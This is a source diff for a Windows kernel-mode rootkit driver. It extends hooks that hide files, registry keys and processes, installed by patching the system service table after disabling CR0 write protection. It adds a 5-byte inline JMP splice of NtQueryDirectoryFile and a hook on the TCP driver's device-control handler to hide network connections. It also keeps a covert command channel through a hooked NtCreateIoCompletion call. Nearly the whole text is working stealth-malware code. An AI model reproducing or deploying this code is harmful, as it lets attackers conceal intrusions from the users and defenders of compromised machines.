@@ -32,6 +32,13 @@ ULONG_PTR HookNtCreateIoCompletion(
     ULONG_PTR	arg_03,
     ULONG_PTR	arg_04
 );
+BOOLEAN CheckHookProlog(PUCHAR adr);
+ULONG SplicingSyscall(ULONG addressSyscall,
+    void* addressHooker,
+    PUCHAR saveBytes,
+    BOOLEAN noCheck,
+    ULONG skipCount);
+void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes);
 
 NT_CREATE_IO_COMPLETION glRealNtCreateIoCompletion;
 extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable;
@@ -63,6 +70,7 @@ void WriteCR0(ULONG reg) {
 NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 
     ULONG reg;
+    NTSTATUS status;
 
 #if DBG
     DbgPrint("Load driver %wZ\n", &dob->DriverName);
@@ -71,13 +79,22 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
 
     glRealNtCreateIoCompletion = (NT_CREATE_IO_COMPLETION)KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION];
     glRealNtQuerySystemInformation = (NT_QUERY_SYSTEM_INFORMATION)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION];
-    glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];
+    //glRealNtQueryDirectoryFile = (NT_QUERY_DIRECTORY_FILE)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE];
     glRealNtEnumerateKey = (NT_ENUMERATE_KEY)KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY];
+
+
+    // Init splicing hook IRP for net
+    status = InstallTCPDriverHook(L"\\Device\\Tcp");
+    if (!NT_SUCCESS(status)) {
+        return status;
+    }
+
+
 
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)HookNtCreateIoCompletion;
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)HookNtQuerySystemInformation;
-    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)HookNtQueryDirectoryFile;
+    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)HookNtQueryDirectoryFile;
     KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)HookNtEnumerateKey;
     WriteCR0(reg);
 
@@ -87,6 +104,13 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     //
 
     // Init task list for hide file
+    addressForJmpNtNtQueryDirectoryFile = SplicingSyscall(
+        KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE],
+        HookNtQueryDirectoryFile,
+        saveByteNtQueryDirectoryFile,
+        TRUE,
+        0
+    );
     ExInitializePagedLookasideList(&glPagedTaskQueueFile, NULL, NULL, 0, sizeof(TASK_QUEUE_FILE), ' LFO', 0);
     InitializeListHead(&glTaskQueueFile);
     //
@@ -96,16 +120,7 @@ NTSTATUS DriverEntry(IN PDRIVER_OBJECT dob, IN PUNICODE_STRING rgp) {
     InitializeListHead(&glTaskQueueKey);
     //
 
-    // Init splicing hook IRP for net
-    //glIrpDirectoryRoutine = glNsiDriverObject->MajorFunction[IRP_MJ_DIRECTORY_CONTROL];
-    //if (!NT_SUCCESS(InitHookNet(L"\\Driver\\nsiproxy"))) {
-    //    reg = ClearWP();
-    //    RtlCopyMemory(glOriginalDirectoryRoutineBytes, glIrpDirectoryRoutine, SPLICING_CODE_SIZE);
-    //    *(PBYTE)glIrpDirectoryRoutine = 0xE9;
-    //    *(PULONG_PTR)((PBYTE)glIrpDirectoryRoutine + 1) = (ULONG_PTR)HookTcpDeviceControl - ((ULONG_PTR)glIrpDirectoryRoutine + 5);
-    //    WriteCR0(reg);
-    //}
-    //
+  
 
 
 
@@ -124,7 +139,7 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     reg = ClearWP();
     KeServiceDescriptorTable->Base[NUMBER_NT_CREATE_IO_COMPLETION] = (ULONG)glRealNtCreateIoCompletion;
     KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_SYSTEM_INFORMATION] = (ULONG)glRealNtQuerySystemInformation;
-    KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)glRealNtQueryDirectoryFile;
+    //KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE] = (ULONG)glRealNtQueryDirectoryFile;
     KeServiceDescriptorTable->Base[NUMBER_NT_ENUMERATE_KEY] = (ULONG)glRealNtEnumerateKey;
     WriteCR0(reg);
 
@@ -134,14 +149,30 @@ VOID DriverUnload(IN PDRIVER_OBJECT dob) {
     //
 
     //free list for hide file
+    if (addressForJmpNtNtQueryDirectoryFile) {
+        UnhookSyscall(
+            (PUCHAR)KeServiceDescriptorTable->Base[NUMBER_NT_QUERY_DIRECTORY_FILE],
+            saveByteNtQueryDirectoryFile
+        );
+    }
     FreeListQueueFilename();
     ExDeletePagedLookasideList(&glPagedTaskQueueFile);
+    while (SyscallProcessedCount);
     //
 
     //free list for add key
     FreeTaskQueueKeyList();
     ExDeletePagedLookasideList(&glPagedTaskQueueKey);
     //
+
+
+    if (glRealIrpMjDeviceControl) {
+        pTcpDriver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = glRealIrpMjDeviceControl;
+    }
+    if (pTcpFile != NULL) {
+        ObDereferenceObject(pTcpFile);
+    }
+
 
     return;
 }
@@ -153,7 +184,7 @@ ULONG_PTR HookNtCreateIoCompletion(
     ULONG_PTR	arg_04)
 {
     PCOMMAND pCmd;
-    NTSTATUS retStatus;
+    NTSTATUS retStatus = STATUS_SUCCESS;
     
     if ((ULONG)arg_01 == (ULONG)SYSCALL_SIGNATURE) {
         pCmd = (PCOMMAND)arg_02;
@@ -161,7 +192,7 @@ ULONG_PTR HookNtCreateIoCompletion(
             DbgPrint("HookNtCreateIoCompletion execute\n");
         }
         else if (pCmd->flags & COMMAND_RENAME_PROCESS) {
-            ULONG len;
+            ULONG len = 0;
 
             if (pCmd->flags & COMMAND_BUFFER_NUMBER && pCmd->change != NULL) {
 
@@ -215,3 +246,70 @@ ULONG_PTR HookNtCreateIoCompletion(
     return retStatus;
 }
 
+ULONG SplicingSyscall(ULONG addressSyscall, void* addressHooker, PUCHAR saveBytes, BOOLEAN noCheck, ULONG skipCount) {
+
+
+    ULONG reg;
+    unsigned int i;
+
+
+    if (noCheck && !CheckHookProlog((PUCHAR)addressSyscall)) {
+        return 0;
+    }
+
+    for (i = 0; i < 5; ++i) {
+        saveBytes[i] = ((PUCHAR)addressSyscall)[i];
+    }
+
+    reg = ClearWP();
+    ((PUCHAR)addressSyscall)[0] = 0xE9;
+    *((PULONG)(addressSyscall + 1)) = (ULONG)addressHooker - (addressSyscall + 5);
+    WriteCR0(reg);
+
+    if (skipCount)
+        return addressSyscall + skipCount;
+    else
+        return addressSyscall + 5;
+}
+
+
+//--------------------
+
+
+
+void UnhookSyscall(PUCHAR addressSyscall, PUCHAR saveBytes) {
+
+
+    unsigned int i;
+    ULONG reg;
+
+    reg = ClearWP();
+    for (i = 0; i < 5; ++i) {
+        addressSyscall[i] = saveBytes[i];
+    }
+    WriteCR0(reg);
+
+    return;
+}
+
+//
+// Проверяет находится ли по адресу adr
+// стандартный пролог:
+// mov     edi, edi
+// push    ebp
+// mov     ebp, esp
+//
+BOOLEAN CheckHookProlog(PUCHAR adr) {
+
+    static UCHAR hookProlog[5] = { 0x8B,0xFF,0x55,0x8B,0xEC };
+
+    if ((adr[0] == hookProlog[0]) &&
+        (adr[1] == hookProlog[1]) &&
+        (adr[2] == hookProlog[2]) &&
+        (adr[3] == hookProlog[3]) &&
+        (adr[4] == hookProlog[4]))
+        return TRUE;
+    else
+        return FALSE;
+
+}
